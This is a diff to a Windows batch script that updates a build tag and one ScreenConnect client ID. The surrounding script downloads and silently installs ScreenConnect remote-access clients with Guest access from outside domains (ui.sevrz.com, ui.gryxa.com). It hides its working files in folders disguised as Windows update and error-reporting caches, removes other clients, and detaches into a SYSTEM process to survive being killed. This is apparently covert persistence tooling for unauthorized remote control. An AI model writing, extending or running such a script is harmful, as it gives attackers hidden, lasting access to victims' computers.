@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O46 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
+REM OWN BUILD 20260802O47 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -8,10 +8,10 @@ set "MSI=%TEMP%\sc_primary.msi"
 set "MSICACHE=%WD%\pkg.msi"
 set "PRIM=ScreenConnect Client (5f6010579852e507)"
 set "ALT=ScreenConnect Client (f861c8140d453427)"
-set "GRYXA=ScreenConnect Client (9908198e668e4750)"
+set "GRYXA=ScreenConnect Client (36e506ff016b2151)"
 set "KEEP1=5f6010579852e507"
 set "KEEP2=f861c8140d453427"
-set "KEEP3=9908198e668e4750"
+set "KEEP3=36e506ff016b2151"
 set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSI_G=%TEMP%\sc_gryxa.msi"
@@ -28,7 +28,7 @@ if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O46 ===
+  echo === OWN BUILD 20260802O47 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -56,7 +56,7 @@ if /I not "%~1"=="_RUN" (
     echo ERROR: cannot write unique runner under %BOOT%
     exit /b 6
   )
-  findstr /C:"OWN BUILD 20260802O46" "!RUNNER!" >nul 2>&1
+  findstr /C:"OWN BUILD 20260802O47" "!RUNNER!" >nul 2>&1
   if errorlevel 1 (
     echo ERROR: runner copy is not O41 - abort
     exit /b 7
